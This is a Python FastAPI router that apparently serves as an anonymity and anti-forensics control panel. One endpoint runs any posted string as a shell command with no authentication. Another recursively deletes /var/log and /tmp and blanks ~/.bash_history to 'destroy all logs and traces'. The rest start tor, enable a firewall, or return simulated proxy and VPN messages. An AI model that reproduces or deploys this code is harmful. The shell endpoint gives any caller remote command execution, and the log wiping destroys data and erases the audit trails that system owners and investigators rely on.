from fastapi import APIRouter, Request, HTTPException
from pydantic import BaseModel
import subprocess
import os
import shutil

router = APIRouter()

class CommandInput(BaseModel):
    command: str

@router.post("/run")
async def run_command(input: CommandInput):
    try:
        result = subprocess.run(input.command, shell=True, capture_output=True, text=True, timeout=10)
        return {"output": result.stdout or result.stderr}
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Command timed out")

@router.post("/destroy-logs")
async def destroy_logs():
    try:
        log_paths = ["/var/log", "/tmp", os.path.expanduser("~/.bash_history")]
        for path in log_paths:
            if os.path.isfile(path):
                open(path, 'w').close()
            elif os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
        return {"message": "All logs and traces destroyed."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/proxy")
async def enable_proxy():
    # This should enable proxychains or your desired proxy tool
    return {"message": "Proxy activated (simulated)."}

@router.post("/firewall")
async def toggle_firewall():
    try:
        subprocess.run("ufw enable", shell=True, capture_output=True)
        return {"message": "Firewall enabled."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/tor")
async def enable_tor():
    try:
        subprocess.Popen(["tor"])  # Make sure tor is installed
        return {"message": "Tor routing activated."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/vpn")
async def enable_vpn():
    # Example VPN command: "openvpn --config /path/to/config.ovpn"
    return {"message": "VPN activated (simulated)."}
